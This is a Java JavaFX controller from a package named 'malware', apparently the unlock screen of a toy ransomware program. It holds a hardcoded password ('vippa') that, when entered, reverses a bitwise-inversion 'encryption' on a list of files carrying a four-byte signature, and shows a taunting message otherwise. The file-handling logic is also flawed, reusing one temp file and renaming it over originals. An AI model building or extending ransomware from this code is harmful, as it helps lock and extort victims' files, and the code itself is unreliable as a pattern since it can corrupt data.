package lk.ijse.dep10.malware.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.TextField;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

public class MainViewController {

    @FXML
    private Button btnDecrypt;

    @FXML
    private TextField txtPassword;

    ArrayList<File> list;
    public void initData(ArrayList<File> list){
        this.list = list;
    }
    public void initialize(){

    }
    @FXML
    void btnDecryptOnAction(ActionEvent event) throws IOException {
        if(txtPassword.getText().equals("vippa")){
            decrypt(list);

            new Alert(Alert.AlertType.CONFIRMATION,"Done!", ButtonType.CANCEL).show();
        }else {
            new Alert(Alert.AlertType.WARNING,"HA HA, Go on son of...",ButtonType.CANCEL).show();
        }
    }
    private void decrypt(ArrayList<File> list) throws IOException {
        File tempFile = File.createTempFile("prefix", "suffix");
        byte[] signature = new byte[]{1,2,3,4};

        for (File file : list) {
            FileInputStream fileInputStream = new FileInputStream(file);
            FileOutputStream fileOutputStream = new FileOutputStream(tempFile);

            byte[] signatureList = new byte[4];
            fileInputStream.read(signatureList);
            boolean shouldDecrypt = true;
            for (int i = 0; i < 4; i++) {
                if(signatureList[i] != signature[i]){
                    shouldDecrypt =false;
                    break;
                }
            }

            if(shouldDecrypt){
                while (true){
                    byte[] buffer = new byte[1024 * 1024 * 10];
                    int read = fileInputStream.read(buffer);
                    if (read == -1) break;

                    for (int i = 0; i < read; i++) {
                        fileOutputStream.write(~buffer[i]);
                    }
                }

                file.delete();
                tempFile.renameTo(file);
            }


            fileInputStream.close();
            fileOutputStream.close();

        }
    }


}
